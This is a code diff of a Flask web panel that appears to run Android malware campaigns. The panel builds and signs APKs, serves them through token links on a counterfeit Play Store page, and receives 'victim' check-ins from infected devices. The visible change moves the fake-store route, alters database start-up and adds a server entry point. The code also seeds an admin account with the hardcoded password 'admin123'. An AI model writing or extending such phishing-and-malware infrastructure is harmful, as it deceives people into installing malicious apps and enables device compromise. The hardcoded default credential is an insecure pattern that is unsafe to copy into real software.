@@ -25,12 +25,17 @@ login_manager.login_view = 'login'
 def load_user(user_id):
     return User.query.get(int(user_id))
 
-with app.app_context():
-    db.create_all()
-    if not User.query.filter_by(username='admin').first():
-        admin = User(username='admin', password_hash=generate_password_hash('admin123'))
-        db.session.add(admin)
-        db.session.commit()
+# Inicializa banco na primeira requisição
+@app.before_request
+def init_db_once():
+    if not hasattr(app, '_db_initialized'):
+        with app.app_context():
+            db.create_all()
+            if not User.query.filter_by(username='admin').first():
+                admin = User(username='admin', password_hash=generate_password_hash('admin123'))
+                db.session.add(admin)
+                db.session.commit()
+        app._db_initialized = True
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -158,6 +163,17 @@ def download_apk(token):
     return send_file(campaign.built_apk_path, as_attachment=True,
                      download_name=f"{campaign.app_name.replace(' ', '_')}.apk",
                      mimetype='application/vnd.android.package-archive')
+
+@app.route('/store/<token>')
+def playstore_page(token):
+    campaign = Campaign.query.filter_by(download_token=token, active=True).first()
+    if not campaign:
+        abort(404)
+    icon_url = url_for('static', filename='default_icon.png')
+    if campaign.icon_path and os.path.exists(campaign.icon_path):
+        icon_url = f"{Config.PANEL_DOMAIN}/uploads/icons/{os.path.basename(campaign.icon_path)}"
+    download_url = f"{Config.PANEL_DOMAIN}/download/{campaign.download_token}"
+    return render_template('playstore.html', campaign=campaign, icon_url=icon_url, download_url=download_url)
 
 @app.route('/api/check-in', methods=['POST'])
 def victim_checkin():
@@ -398,16 +414,8 @@ def sign_apk(apk_path):
         except Exception:
             pass
 
-@app.route('/store/<token>')
-def playstore_page(token):
-    campaign = Campaign.query.filter_by(download_token=token, active=True).first()
-    if not campaign:
-        abort(404)
-    icon_url = url_for('static', filename='default_icon.png')
-    if campaign.icon_path and os.path.exists(campaign.icon_path):
-        icon_url = f"{Config.PANEL_DOMAIN}/uploads/icons/{os.path.basename(campaign.icon_path)}"
-    download_url = f"{Config.PANEL_DOMAIN}/download/{campaign.download_token}"
-    return render_template('playstore.html', campaign=campaign, icon_url=icon_url, download_url=download_url)
-
-# Railway entry point - gunicorn calls this directly
+# Railway entry point
 port = int(os.environ.get('PORT', 5000))
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=port, debug=False)
